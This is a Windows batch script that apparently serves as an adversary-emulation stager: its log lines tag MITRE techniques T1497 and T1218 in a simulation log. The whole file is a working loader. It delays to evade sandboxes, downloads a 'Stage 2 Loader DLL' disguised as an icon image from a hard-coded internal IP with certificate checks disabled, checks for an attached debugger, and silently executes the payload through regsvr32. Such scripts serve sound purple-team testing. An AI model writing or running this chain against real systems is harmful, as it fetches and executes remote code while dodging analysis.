@echo off
setlocal enabledelayedexpansion

REM Random-named SET variable declarations for all PHR_* placeholders
SET x2k9z1=%APPDATA%\10740\c4cab8c9
SET q7w3m2=419333be.txt
SET a8b4c6=https://10.0.0.49/stage/2/icon.png?10740-7
SET h5d1e9=BALAM-S2BO
SET n6f7g3=10740
SET p0r2s4=7
SET t8u5v7=%PUBLIC%\\macula-simulations.log

REM Cache timestamp at script start
SET tsvar=!DATE!/!TIME!

REM =====================================================================
REM PHASE 0 : Initial sandbox evasion delay (10-20s)
REM =====================================================================
timeout /t 15 /nobreak >nul

REM =====================================================================
REM PHASE 1 : Heartbeat fetch – download Stage 2 Loader DLL
REM =====================================================================
echo [!tsvar!][DEBUG][!h5d1e9!][!n6f7g3!]: heartbeat_start>> "!t8u5v7!" 2>nul
curl -k -s -o "!x2k9z1!\!q7w3m2!" "!a8b4c6!"
echo [!tsvar!][DEBUG][!h5d1e9!][!n6f7g3!]: heartbeat_complete>> "!t8u5v7!" 2>nul

REM =====================================================================
REM PHASE 2 : Random delay (10-30s) + anti-analysis check
REM =====================================================================
SET /A delay=%RANDOM% %% 20 + 10
timeout /t !delay! /nobreak >nul

REM Anti-analysis: Debugger.IsAttached check (via PowerShell)
SET debugger_detected=0
powershell -Command "if ([System.Diagnostics.Debugger]::IsAttached) { Start-Sleep -Seconds ((Get-Random -Minimum 2 -Maximum 5)); exit 1 } else { exit 0 }" >nul 2>&1
if not !errorlevel! equ 0 set debugger_detected=1

REM Log T1497 regardless
if !debugger_detected! equ 1 (
    echo [!tsvar!][TTP][!h5d1e9!][!n6f7g3!]: T1497^|Virtualization/Sandbox Evasion=FAIL:DebuggerDetected>> "!t8u5v7!" 2>nul
) else (
    echo [!tsvar!][TTP][!h5d1e9!][!n6f7g3!]: T1497^|Virtualization/Sandbox Evasion=OK:>> "!t8u5v7!" 2>nul
)

REM =====================================================================
REM PHASE 3 : Change working directory to output directory
REM =====================================================================
echo [!tsvar!][DEBUG][!h5d1e9!][!n6f7g3!]: chdir_start>> "!t8u5v7!" 2>nul
cd /d "!x2k9z1!" >nul 2>&1
if !errorlevel! equ 0 (
    echo [!tsvar!][DEBUG][!h5d1e9!][!n6f7g3!]: chdir_result=0>> "!t8u5v7!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!h5d1e9!][!n6f7g3!]: chdir_result=1>> "!t8u5v7!" 2>nul
)

REM =====================================================================
REM PHASE 4 : Intermediate delay (5-15s)
REM =====================================================================
ping -n 8 127.0.0.1 >nul

REM =====================================================================
REM PHASE 5 : Invoke the Stage 2 Loader DLL via regsvr32 (LOLBIN)
REM =====================================================================
echo [!tsvar!][DEBUG][!h5d1e9!][!n6f7g3!]: regsvr32_start>> "!t8u5v7!" 2>nul
regsvr32.exe /s "!x2k9z1!\!q7w3m2!"
if !errorlevel! equ 0 (
    echo [!tsvar!][DEBUG][!h5d1e9!][!n6f7g3!]: regsvr32_result=0>> "!t8u5v7!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!h5d1e9!][!n6f7g3!]: regsvr32_result=1>> "!t8u5v7!" 2>nul
)

REM =====================================================================
REM PHASE 6 : Final delay before logging T1218
REM =====================================================================
CHOICE /C Y /N /D Y /T 10 >nul

REM =====================================================================
REM PHASE 7 : Log T1218 – System Binary Proxy Execution
REM =====================================================================
if !errorlevel! equ 0 (
    echo [!tsvar!][TTP][!h5d1e9!][!n6f7g3!]: T1218^|System Binary Proxy Execution=OK:>> "!t8u5v7!" 2>nul
) else (
    echo [!tsvar!][TTP][!h5d1e9!][!n6f7g3!]: T1218^|System Binary Proxy Execution=FAIL:Regsvr32Error>> "!t8u5v7!" 2>nul
)

REM =====================================================================
REM PHASE 8 : Final cleanup / exit
REM =====================================================================
exit /b 0